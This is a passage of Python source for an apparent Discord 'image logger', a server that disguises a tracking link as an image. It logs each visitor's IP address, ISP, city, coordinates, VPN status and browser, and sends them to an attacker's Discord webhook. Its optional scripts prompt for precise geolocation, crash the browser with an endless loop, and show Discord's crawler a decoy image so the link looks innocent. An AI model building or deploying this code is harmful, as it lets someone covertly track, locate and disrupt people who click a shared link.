> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
